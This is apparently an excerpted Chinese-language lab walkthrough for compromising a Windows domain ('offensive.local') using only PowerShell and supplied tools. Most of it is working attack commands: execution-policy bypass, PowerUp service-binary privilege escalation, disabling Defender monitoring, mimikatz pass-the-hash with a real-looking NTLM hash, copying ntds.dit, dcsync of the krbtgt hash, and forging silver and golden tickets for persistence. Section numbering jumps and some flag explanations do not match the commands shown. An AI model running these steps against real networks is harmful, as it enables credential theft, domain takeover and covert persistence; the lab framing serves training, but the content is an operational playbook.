1.4 渗透要求

要求获取域控权限，且只能使用客户机提供的工具以及powershell，已经拥有192.168.159.10的一个用户权限，工具已经放在主机内。

2、信息收集

1.查看当前用户

2.查看当前用户是否在本地administrators组中

net localgroup administrators

发现该用户不在administrators用户组中

3、权限提升

1.使用powershell执行策略

Powershell -ep bypass

2.导入PowerUp脚本

cd C:\Users\alice\Desktop\tools

#导入PowerUp.ps1脚本
Import-Module .\PowerUp.ps1

3.使用Invoke-AllChecks模块进行检测

Invoke-AllChecks -verbose

从执行该脚本输出的结果来看，可以利用下面这个危险的服务进行提权，服务名称为：VulnService

4.创建服务绑定本地用户

write-servicebinary -servicename vulnservice -username "offensive\alice" -password Password!

#该命令会在本目录下生成一个service.exe文件，该文件启动时会将用户offensive\alice提权到管理员组内。需要注意的是，这里的username必须是域内已经存在的用户，而password的话，则随便填，可以是这个域用户的正确密码，也可以随便指定密码，这对该域用户的密码无影响。

5.复制本路径下的service.exe文件到指定的程序

cp .\service.exe "C:\Program Files\Vuln Service\VulnService.exe"

6.查看服务状态

sc qc VulnService

服务已经配置成功，可以重启服务器

7.查看用户所在本地用户组权限

net localgroup administrators

查看用户Alice已经在本地administrators组中

5.4 Pass The Hash攻击

1.获取dbadmin的NTML值

2.在Alice主机中使用mimikatz

在Alice主机新开一个管理员权限的powershell终端

Set-MpPreference -disablerealtimeMonitoring $true
cd C:\Users\Alice\Desktop\tools\mimikatz_trunk\x64
.\mimikatz.exe
privilege::debug

3.使用PTH进行攻击

sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:powershell.exe

# /domain：当前域名称

# /user: dbadmin（也就是Offensive-SQL1）

# /domain: 所在域

# /ntlm: dbadmin的hash

# /run: 派生的命令

已派生新的powershell终端

也可以精简一句话

 .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:powershell.exe" exit

至此数据库已经被拿下

Copy-Item '\\dc.offensive.local\C$\Users\dbadmin\Desktop\ntds.dit' -Destination '\\Client1.offensive.local\C$\Users\alice\Desktop\tools\ntds.dit'

1.制作银票的条件：

2.获取本机用户名、口令、sid、LM hash、NTLM hash

sekurlsa::logonpasswords

数据库的NTLM Hash: fc525c9683e8fe067095ba2ddc971889

3.使用Mimikatz命令创建白银票据

使用kerberos::golden，传递域SID，目标主机名，服务名称，服务帐户的NTLM哈希，用户名和组信息，以创建Silver Ticket。

/domain：当前域名称

/sid：SID值，和金票一样取前面一部分

/target：目标主机，这里是Offensive-SQL1:1433

/rc4：目标主机的HASH值

/user：伪造的用户名

/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入

7 权限维持

Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。

1.制作金票的条件

1、域名称

2、域的SID值

3、域的KRBTGT账户密码HASH

4、伪造用户名，可以是任意的

2.金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中获取

lsadump::dcsync /dc.offensive.local /user:krbtgt

3.生成伪造TGT

kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116 /domain:offensive.local /rc4:61d83c569b93bfcd4ca2087011361caa /user:idontexist /id:500
/admin：伪造的用户名

/domain：域名称

/sid：SID值，注意是去掉最后一个-后面的值

/krbtgt：krbtgt的HASH值

/ticket：生成的票据名称

4.通过mimikatz中的kerberos::ptt功能导入内存

使用kerberos::ptt功能（Pass The Ticket）将ticket.kirbi导入内存中

kerberos::purge
kerberos::ptt ticket.kirbi
kerberos::list
